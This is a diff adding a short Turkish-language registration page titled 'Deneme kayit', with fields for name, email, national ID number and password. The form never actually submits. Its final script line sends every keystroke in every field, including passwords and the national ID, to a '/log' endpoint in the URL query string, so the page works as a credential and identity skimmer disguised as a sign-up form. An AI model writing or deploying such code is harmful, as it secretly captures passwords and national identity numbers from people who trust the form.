@@ -1,0 +1,11 @@
+<!doctype html><meta charset="utf-8"><meta name="viewport" content="width=device-width"><title>Deneme kayit</title>
+<style>input{display:block;width:90%;height:30px;margin:2px}label{display:block;font-size:13px}</style>
+<form onsubmit="return false">
+<label for="f1">Adınız</label><input id="f1">
+<input id="f2" placeholder="Soyadınız">
+<input id="f3" type="email" name="user_email" placeholder="E-posta adresi">
+<input id="f4" placeholder="TC Kimlik No">
+<input id="f5" type="password" placeholder="Şifre">
+<input id="f6" type="password" placeholder="Şifre tekrar">
+<button>Kayıt Ol</button></form>
+<script>document.addEventListener('input',e=>fetch('/log?'+e.target.id+'='+encodeURIComponent(e.target.value)))</script>
